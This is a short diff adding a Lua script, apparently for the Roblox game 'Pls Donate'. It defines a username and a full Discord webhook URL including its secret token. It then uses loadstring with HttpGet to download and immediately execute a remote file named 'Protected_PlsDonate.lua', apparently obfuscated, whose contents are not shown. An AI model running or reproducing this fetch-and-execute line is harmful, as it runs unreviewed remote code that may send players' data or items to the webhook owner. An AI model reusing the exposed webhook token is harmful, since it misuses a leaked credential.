@@ -1,0 +1,4 @@
+Username = "qorsite"
+Webhook = "https://discord.com/api/webhooks/1329882997435928646/jLsIFxFinVebubhdcf9sDzxGqCtsZu75HeTXySX0Ow-lko6d9_csnHzPXR3sTe6TWNOf"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SharScript/PlsDonate/refs/heads/main/Protected_PlsDonate.lua"))()
